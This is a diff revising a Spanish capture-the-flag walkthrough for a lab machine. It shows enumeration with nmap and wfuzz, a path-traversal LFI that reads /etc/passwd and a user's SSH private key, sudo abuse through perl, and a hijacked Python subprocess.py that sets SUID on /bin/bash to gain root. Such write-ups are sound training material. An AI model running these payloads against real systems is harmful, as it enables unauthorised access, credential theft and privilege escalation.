@@ -5,7 +5,7 @@ ___
 
 #### FASE RECOPILACIÓN:  
 
-Primero, buscamos los puertos, servicios y versiones con nmap:  
+Primero, Escaneamos puertos, servicios y versiones del objetivo con `nmap`:  
 
  `nmap -n -v -sV -sC --min-rate 5000 <IP>`  
 
@@ -15,15 +15,15 @@ Primero, buscamos los puertos, servicios y versiones con nmap:
 
  `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://<IP>/FUZZ"`  
 
- Los más importante que aparece es el `index.php`. Entonces, dado que no hay más, proseguimos con fuzzear por Parámetros URL en dicho recurso con `wfuzz` nuevamente:  
+ Los más importante que aparece es el `index.php`. Entonces, dado que no hay más, proseguimos a **Buscar Vulnerabilidades** fuzzeando Parámetros URL en dicho recurso. Usamos `wfuzz` nuevamente:  
  
  `wfuzz -c --hc 404 -t 200 -z file,rockyou.txt -u "http://<IP>/index.html?FUZZ=1"`  
 
-Entramos a `secret`.  
+Encontramos a `secret`.  
 
-#### FASE EXPLOTACIÓN:  
+#### FASE EXPLOTACIÓN (Ganar Acceso):  
 
-Bien, probando y probando, encotramos que podemos intentar un LFI en dicho parámetro. Queda:  
+Bien, probando y probando, encontramos que podemos intentar un LFI en dicho parámetro. Queda:  
 
 `wfuzz -c --hc 404 -t 200 -z list,"../../../../../etc/passwd" -u http://<IP>/index.php?secret=FUZZ"`  
 
@@ -31,37 +31,38 @@ o directamente en el navegador:
 
 `http://<IP>/index.php?secret=../../../../../etc/passwd`  
 
-Bien, conseguimos leer el archivo `/etc/passwd` con lo cual podemos Enumerar Usuarios. Encontramos a `luisillo`, `ubuntu` y `vaxei`.  
+Bien, conseguimos leer el archivo `/etc/passwd` con lo cual ya podemos **Enumerar Usuarios** y encontramos a `luisillo`, `ubuntu` y `vaxei`.  
 
-Bien, de la misma manera que leimos `/etc/passwd` podemos seguir buscando otros ficheros importantes del sistema, como por ejemplo, `http://<IP>/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa`. Mediante el mismo, podemos tener acceso a la Clave Privada del usuario `vaxei`, por lo cual ya podemos tener acceso al sistema:  
+Bien, de la misma manera que leimos `/etc/passwd` podemos seguir buscando otros ficheros importantes del sistema. Después de mucho intentar encontramos a `http://<IP>/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa`.  
+El mismo trata de la **Clave Privada** del usuario `vaxei`, por lo cual ya podemos tener **footholding** quizás.  
 
-Copiamos dicha clave localmente e intentamos `ssh -i id_rsa vaxei@<IP>`. Hacemos `whoami`. Tenemos acceso.  
+Copiamos dicha clave localmente e intentamos `ssh -i id_rsa vaxei@<IP>`. Hacemos `whoami` y confirmamos el acceso.  
 
 #### FASE POST-EXPLOTACIÓN (Escalar Privilegios):  
 
-Una de las primeras cosas que debemos hacer cuando ya tenemos un pie adentro es ver los **Privilegios Sudo**:  
+Una de las primeras cosas que debemos hacer cuando ya tenemos un pie dentro es ver los **Privilegios Sudo**:  
 
 `sudo -l`  
 
-El resultado nos dice que podemos usar `perl` como `luisillo` para convertirmos en él. Vamos a la web https://gtfobins.github.io/ y encontramos que corriendo: `sudo -u luisillo perl -e 'exec "/bin/bash";'`. Somos `luisillo`.  
+El resultado nos mustra que podemos usar `/usr/bin/perl` como `luisillo` para convertirnos en él. Vamos a la web https://gtfobins.github.io/ y concluimos corriendo `sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'` como `vaxei`.  
+Enseguida `whoami` y somos `luisillo`.  
 
-Chequeando los Privilegios Sudo con este usuario,vemos que los tenemos sobre un script en particular:  `/opt/paw.py`  
+Chequeando los **Privilegios Sudo** con este usuario lanzando `sudo -l`, vemos que tenemos sobre un script en particular usando Python3:  `/usr/bin/python3 /opt/paw.py`  
 
-Al correr dicho script con `python3 /opt/paw.py` vemos que lanza un error al no encontrar la librería `/usr/lib/python3.12/subprocess.py`. Gracias al mismo, nos damos cuenta que podemos crear nuestro propio fichero malicioso que sea llamado por el script, ya que al ser un script primero busca en su propio nivel, es decir en el directorio que lo contiene.  
+Al ejecutar `sudo /usr/bin/python3 /opt/paw.py` vemos que lanza un error al no encontrar la librería `/usr/lib/python3.12/subprocess.py`. Gracias a este, nos damos cuenta que podemos crear nuestro propio sub-script python malicioso para ser llamado por el principal. Es script llama, por defecto, a su propio nivel al principio, es decir en el directorio que lo contiene, y luego la ubicación por default.  
 
-Con esto en mente, creamos un `subprocess.py` malicioso en `/opt` con este código, por ejemplo:  
+Con esto en mente, nos movemos a `/opt/` y creamos un `subprocess.py` malicioso en `/opt` con:    
 
 `cd /opt && nano subprocess.py` 
 
-```
-#!/bin/usr/env python3
-import os;
-os.system("chmod u+s /bin/bash");
-```  
+> ```
+> #!/bin/usr/env python3
+> import os;
+> os.system("chmod u+s /bin/bash");
+> ```  
 
-Le damos permisos de ejecutable con `chmod +x subprocess.py`.
+Le damos permisos de ejecutable con `chmod +x subprocess.py`. 
 
-El mismo le da permisos SUID a /bin/bash en caso de ser root y, como tenemos permisos sudo sobre el script `/opt/paw.py`, tendríamos éxito.  
+Este script malicioso le da permisos SUID a `/bin/bash` en caso de ser root y, como tenemos permisos sudo con `/usr/bin/python3 /opt/paw.py`, tendríamos éxito.  
 
-Lanzamos el siguiente comando `sudo python3 /opt/paw.py` y lanza un error sin importancia.  Corremos ahora `bash -p` y somos root. Eso es todo.  
-
+Lanzamos entonces `sudo /usr/bin/python3 /opt/paw.py`, nos muestra un error sin importancia, corremos `bash -p` y somos root. Eso es todo.
